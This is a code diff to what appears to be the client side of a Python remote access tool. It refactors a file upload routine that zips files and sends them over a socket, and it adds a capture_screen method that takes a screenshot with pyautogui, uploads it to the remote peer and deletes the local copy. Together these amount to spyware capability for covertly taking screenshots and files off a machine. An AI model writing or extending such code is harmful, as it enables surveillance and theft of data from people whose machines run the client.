@@ -2,6 +2,9 @@ from ctypes import addressof
 import socket
 import os
 import zipfile
+import pyautogui
+
+
 
 
 DELIMITER = "<EOF>"
@@ -38,12 +41,7 @@ class clientConnection:
                 file.write(chunk)
             print("[+] Transfer completed")
 
-    def upload_file(self ):
-        
-        print("waiting for path...")
-        path = self.recieve_data()
-        print("Navigating to " , path)
-
+    def upload_file(self , path):
         filename = os.path.basename(path).split(".")[0]
 
         zipped_name = filename + '.zip'
@@ -57,9 +55,10 @@ class clientConnection:
             zipf.close()
         else:
             zipf.write(path)
+            zipf.close()
 
-        with zipfile.ZipFile(zipped_name , "r") as zip:
-                zip.printdir()
+
+         
             
         self.send_data(zipped_name)
         with open(zipped_name , 'rb') as file:
@@ -74,7 +73,17 @@ class clientConnection:
 
             print("Transfer complete")
         
+    def capture_screen(self):
+        print("[+] Taking screenshot")
+        screenshot = pyautogui.screenshot()
 
+        screenshot_name = "screenshot.png"
+
+        screenshot.save(screenshot_name)
+        self.upload_file(screenshot_name)
+        os.remove(screenshot_name) 
+
+        
         
 
 
